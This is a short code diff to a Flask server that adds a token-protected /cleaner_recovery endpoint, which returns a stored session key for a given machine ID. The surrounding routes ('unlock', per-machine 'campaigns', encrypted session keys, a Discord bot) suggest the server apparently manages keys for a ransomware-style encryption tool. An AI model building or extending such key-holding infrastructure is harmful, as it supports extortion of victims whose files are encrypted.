@@ -23,6 +23,7 @@ from cryptography.hazmat.primitives import hashes
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = 64 * 1024
 
+CLEANER_TOKEN = os.environ.get("CLEANER_TOKEN", "")
 MASTER_KEY_B64 = os.environ.get("MASTER_KEY_B64", "")
 STATE_FILE = Path(os.environ.get("STATE_FILE", "/tmp/fcrypt_state.json"))
 TS_WINDOW = 300
@@ -604,6 +605,35 @@ def unlock():
     return jsonify({"status": "ok", "session_key_enc": enc_hex,
                     "nonce": nonce_hex}), 200
 
+
+@app.route("/cleaner_recovery", methods=["POST"])
+def cleaner_recovery():
+    try:
+        req = request.get_json(force=True, silent=True) or {}
+    except Exception:
+        return jsonify({"status": "error", "reason": "bad_json"}), 400
+
+    token = str(req.get("token", ""))
+    machine_id = str(req.get("machine_id", "")).strip().lower()
+
+    if not CLEANER_TOKEN:
+        return jsonify({"status": "error", "reason": "cleaner_disabled"}), 403
+    if not hmac.compare_digest(token, CLEANER_TOKEN):
+        return jsonify({"status": "error", "reason": "unauthorized"}), 403
+    if not machine_id:
+        return jsonify({"status": "error", "reason": "missing_machine_id"}), 400
+
+    _refresh_state()
+    keys = []
+    with _state_lock:
+        for k, v in STATE.items():
+            if k.startswith("c:") and isinstance(v, dict) and v.get("machine_id") == machine_id:
+                keys.append(v["session_key"])
+
+    if not keys:
+        return jsonify({"status": "error", "reason": "no_campaigns_found"}), 404
+
+    return jsonify({"status": "ok", "session_key": keys[0]}), 200
 
 # ---- Discord bot ----
 
